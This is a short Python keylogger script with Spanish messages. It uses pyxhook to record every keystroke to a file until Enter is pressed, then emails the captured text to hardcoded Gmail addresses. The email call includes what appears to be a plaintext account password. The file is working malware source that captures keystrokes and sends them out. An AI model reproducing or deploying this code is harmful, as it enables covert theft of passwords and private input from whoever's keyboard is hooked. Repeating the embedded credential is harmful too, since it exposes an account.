
from enviador_correo import *
import pyxhook
import time



def fix_text():
    f=open("kk.txt")
    lines = f.readlines()
    f.close()
    lines_str=str(lines)
    x = lines_str.replace("space", " ")
    return x


def Enter_event(event):
    global running

    if event.Ascii == 32:
        f.write(' ')
    evento=str(event.Key)
    f.write(evento)

    if event.Ascii == 32:
        f.write(' ')

    if event.Ascii == 13:
        running = False
    
def Keylogger():
    print("\n")
'''   
mail=input('\nIntroduce una cuenta de correo de Gmail: ')
password=input('\nIntroduce la contraseña de la cuenta: ')
mail_send=input('\nIntroduce la cuenta de correo a la que lo quieres enviar: ')
'''
print('\nModo de captura de teclado activado\n')
f=open("kk.txt","w")
hookman = pyxhook.HookManager()
hookman.KeyDown = Enter_event
hookman.HookKeyboard()
hookman.start()

running = True

while running:
    time.sleep(0.1)


hookman.cancel()
f.close()
text=fix_text()
print('\nModo de captura de teclado desactivo\n')
enviador('p.vlopez@udc.es','molamecosas8@gmail.com','asertivo007','Keylogger',text)
